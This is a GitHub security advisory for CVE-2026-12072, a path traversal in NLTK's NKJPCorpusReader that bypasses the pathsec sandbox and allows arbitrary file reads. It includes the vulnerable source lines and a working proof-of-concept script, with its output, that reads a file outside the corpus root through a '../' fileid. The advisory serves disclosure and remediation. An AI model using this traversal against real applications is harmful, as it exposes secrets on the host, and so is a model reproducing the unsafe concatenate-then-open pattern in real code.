# [H] Natural Language Toolkit (NLTK): Path Traversal in NKJPCorpusReader leads to Arbitrary File Read and bypasses the nltk.pathsec sandbox (ENFORCE=True)

## Summary
Severity: High
Advisory: GHSA-6hm5-jgcp-p838
CVE: CVE-2026-12072
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-31
Source: https://github.com/advisories/GHSA-6hm5-jgcp-p838
Type: github-advisory

## Affected
- PyPI: `nltk` — affected >=0 <3.10.0

## Details
### Summary
   A path-traversal vulnerability in `NKJPCorpusReader` allows an attacker who can
   influence the `fileids` argument of its public read methods (`header`, `raw`,
   `words`, `sents`, `tagged_words`) to read files outside the corpus root. The
   reader builds the file path with no containment check and opens it with the
   builtin `open()`, so it bypasses NLTK's `nltk.pathsec` sandbox — including the
   strict `ENFORCE = True` mode that `SECURITY.md` recommends for web/multi-tenant
   deployments. `header()` returns the parsed content of the out-of-root file to
   the caller (arbitrary file read).

   ### Details
   `SECURITY.md` promises that file access is "validated against allowed NLTK data
   directories" and that with `nltk.pathsec.ENFORCE = True` "unauthorized file
   access … will raise `PermissionError`." That guarantee is enforced via
   `FileSystemPathPointer.open()` / `CorpusReader.open()`, which call
   `nltk.pathsec.validate_path(...)`.

   `NKJPCorpusReader` never uses that protected path. In
   `nltk/corpus/reader/nkjp.py`:

   - `add_root()` builds the path by **plain string concatenation** with no
     normalization or containment check:
     ```python
     def add_root(self, fileid):          # lines 96-102
         if self.root in fileid:
             return fileid                # attacker-controlled value returned unchanged
         return self.root + fileid        # plain concat, '..' not stripped
     ```
   - The header view appends a fixed basename and passes the string straight into
     the corpus view (which opens it with the builtin `open()`):
     ```python
     class NKJPCorpus_Header_View(XMLCorpusView):   # line 181
         def __init__(self, filename, **kwargs):
             XMLCorpusView.__init__(self, filename + "header.xml", self.tagspec)  # line 189
     ```
   - The other modes reach the filesystem through `XML_Tool`, which uses a raw
     `os.path.join` (not the hardened `FileSystemPathPointer.join()`) and the
     builtin `open()`:
     ```python
     class XML_Tool:                                  # line 243
         def __init__(self, root, filename):
             self.read_file = os.path.join(root, filename)   # line 251
         def build_preprocessed_file(self):
             fr = open(self.read_file)                        # line 256 — pathsec never consulted
     ```

   Because `open()` is the builtin (not `PathPointer.open()`), the `pathsec`
   sentinel is never invoked, so `ENFORCE = True` does not block the access. For
   comparison, the safe API `CorpusReader.open()` (`nltk/corpus/reader/api.py:222`)
   rejects `..`/absolute fileids and calls `validate_path(..., required_root=...)`
   before opening — `NKJPCorpusReader` simply does not go through it.

   ### PoC
   Tested against `nltk==3.9.4` (latest PyPI release) and current `develop`.

   ```
   pip install "nltk==3.9.4"
   python3 poc.py
   ```

   `poc.py`:
   ```python
   import builtins, os, shutil, tempfile, warnings
   warnings.simplefilter("ignore")
   import nltk, nltk.pathsec as pathsec
   from nltk.corpus.reader.nkjp import NKJPCorpusReader

   print("nltk", nltk.__version__)

   # A legitimate, empty NKJP corpus root (what a real app has).
   root = tempfile.mkdtemp(prefix="nkjp_corpus_root_")
   os.makedirs(os.path.join(root, "sample"), exist_ok=True)
   open(os.path.join(root, "sample", "header.xml"), "w").write("<x/>")

   # The attacker's target: a file OUTSIDE the corpus root.
   secret_dir = tempfile.mkdtemp(prefix="OUTSIDE_ROOT_")
   open(os.path.join(secret_dir, "header.xml"), "w").write(
   "<teiHeader><fileDesc><sourceDesc><bibl>"
   "<title>SECRET-API-KEY=sk-live-DEADBEEF</title>"
       "</bibl></sourceDesc></fileDesc></teiHeader>")

   # Enable the strict mode SECURITY.md recommends for web / multi-tenant.
   pathsec.ENFORCE = True
   print("ENFORCE =", pathsec.ENFORCE)

   # Prove the out-of-root read and that pathsec is never consulted.
   opened = []; real = builtins.open
   builtins.open = lambda f, *a, **k: (opened.append(str(f)), real(f, *a, **k))[1]

   reader = NKJPCorpusReader(root=root + "/", fileids="sample")
   # Attacker-controlled `fileids`; '..' escapes the corpus root:
   evil = root + "/../../../../../../.." + secret_dir + "/"
   try:
       result = reader.header(fileids=[evil])
   finally:
       builtins.open = real

   print("opened outside root:", [p for p in opened if "OUTSIDE_ROOT_" in p][:1])
   print("disclosed content  :", result[0]["title"])
   shutil.rmtree(root, ignore_errors=True); shutil.rmtree(secret_dir, ignore_errors=True)
   ```

   Output (unmodified):
   ```
   nltk 3.9.4
   ENFORCE = True
   opened outside root: ['/tmp/nkjp_corpus_root_XXXX/../../../../../../../tmp/OUTSIDE_ROOT_YYYY/header.xml']
   disclosed content  : SECRET-API-KEY=sk-live-DEADBEEF
   ```
   With `ENFORCE = True`, NLTK opened a file outside the corpus root via the
   builtin `open()` (no `PermissionError`, no warning) and returned its content.

   ### Impact
   This is a path traversal (CWE-22) leading to arbitrary file read. Any
   application that passes attacker-influenced values into `NKJPCorpusReader`'s
   `fileids` (e.g. letting a user choose which corpus document to read) is
   affected; the attacker can escape the corpus root and read files elsewhere on
   the host, defeating the `ENFORCE=True` sandbox.

   Honest scoping: `header()` discloses the content of out-of-root files named
   `header.xml` containing NKJP header XML. `raw()`/`words()`/`sents()` also open
   and read an arbitrary out-of-root file (proven by intercepting `open()`), but a
   separate pre-existing bug in `XML_Tool` (writing `str` to a binary
   `NamedTemporaryFile`) suppresses their return value on current Python, so for
   those modes the impact is arbitrary file open/read. The attacker chooses the
   directory freely; a fixed basename is appended per mode. The same
   "build-path-then-builtin-open, skipping pathsec" anti-pattern also appears in
   `xmldocs.py:161`, `util.py:212,215`, `crubadan.py:78,97`, `lin.py:43`,
   `ipipan.py:191`, `pl196x.py:110` and is worth fixing as a class.

## References
- https://github.com/nltk/nltk/security/advisories/GHSA-6hm5-jgcp-p838
- https://github.com/nltk/nltk
